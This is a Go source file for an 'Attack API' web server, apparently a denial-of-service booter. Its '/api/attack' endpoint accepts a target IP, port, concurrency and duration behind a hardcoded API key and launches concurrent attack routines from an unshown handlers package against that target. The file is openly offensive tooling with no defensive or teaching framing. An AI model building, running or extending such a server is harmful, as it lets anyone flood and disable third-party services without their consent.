package main

import (
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/eikarna/GinTack/handlers"
	"github.com/gin-gonic/gin"
)

var validAPIKey = "nixarl"
var serverStatus = "Running"

// Middleware to check API key
func apiKeyAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		apiKey := c.PostForm("ApiKey")
		if apiKey != validAPIKey {
			c.JSON(http.StatusUnauthorized, gin.H{"message": "Invalid API Key"})
			c.Abort()
			return
		}
		c.Next()
	}
}

func main() {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	// Landing page
	r.GET("/", func(c *gin.Context) {
		c.String(http.StatusOK, "Welcome to the Attack API server!")
	})

	// Attack API
	r.POST("/api/attack", apiKeyAuth(), func(c *gin.Context) {
		ip := c.PostForm("ip")
		port := c.PostForm("port")
		concurrency := c.PostForm("concurrency")
		duration := c.PostForm("time")

		portNum, err := strconv.Atoi(port)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid port"})
			return
		}

		concurrencyNum, err := strconv.Atoi(concurrency)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid concurrency"})
			return
		}

		timeDuration, err := strconv.Atoi(duration)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid time"})
			return
		}

		// Start the attack
		wg := sync.WaitGroup{}
		wg.Add(concurrencyNum)

		for i := 0; i < concurrencyNum; i++ {
			attack := handlers.NewAttack(ip, portNum, concurrencyNum, time.Duration(timeDuration)*time.Second)
			go attack.Start(&wg)
		}

		wg.Wait()
		c.JSON(http.StatusOK, gin.H{"message": "Attack completed"})
	})

	// Status API
	r.GET("/status", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": serverStatus})
	})

	// Start the server
	r.Run(":8080")
}
